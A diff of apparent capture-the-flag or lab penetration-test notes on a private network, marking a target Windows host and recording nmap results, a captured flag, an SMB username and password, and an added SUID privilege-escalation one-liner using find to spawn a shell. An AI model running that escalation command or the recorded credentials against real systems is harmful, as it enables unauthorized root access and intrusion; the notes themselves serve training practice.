@@ -1,4 +1,4 @@
-192.168.100.55   WINSERVER-03     
+192.168.100.55   WINSERVER-03   **TARGET**  
 192.168.100.50   WINSERVER-01     
 192.168.100.52   IP-192-168-100-  **X**
 192.168.100.51   WINSERVER-02  **X**
@@ -60,6 +60,9 @@ MAC Address: 02:A4:4B:19:5A:E9 (Unknown)
 **dbadmin@ip-192-168-100-52:/home/auditor$ cat flag.txt**
 **8a188d64fa234fe9b9671ba4bd6e11e4**
 
+```
+SUID BIT PRIV ESC./find . -exec /bin/sh -p \; -quit
+```
 
 
 Nmap scan report for ip-192-168-100-55.eu-central-1.compute.internal (192.168.100.55)
@@ -69,7 +72,7 @@ PORT     STATE SERVICE
 80/tcp   open  http
 135/tcp  open  msrpc
 139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds ----> **ACCOUNT (lawrence:computadora**)
+445/tcp  open  microsoft-ds ----> **ACCOUNT (lawrence:computadora**) READ ONLY
 3389/tcp open  ms-wbt-server
 MAC Address: 02:2A:CB:0B:8D:55 (Unknown)
 
